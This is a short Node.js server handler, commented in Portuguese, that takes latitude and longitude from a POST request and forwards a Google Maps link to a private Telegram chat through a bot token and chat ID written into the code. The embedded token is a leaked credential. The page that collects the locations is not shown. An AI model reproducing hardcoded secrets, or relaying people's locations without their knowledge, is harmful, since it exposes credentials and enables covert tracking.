const fetch = require('node-fetch'); // Não esqueça de instalar isso com npm se usar local

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido.' });
  }

  const { latitude, longitude } = req.body;

  const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
  const mensagem = `📍 Localização enviada: ${link}`;

  const BOT_TOKEN = "7899777703:AAHXpSnR_1lEaSRGzsxqrHn9-bInXMgpe98";
  const CHAT_ID = "6083274663";

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensagem })
    });

    res.status(200).json({ status: 'Localização enviada com sucesso!' });
  } catch (error) {
    res.status(500).json({ error: 'Erro ao enviar a localização.' });
  }
};
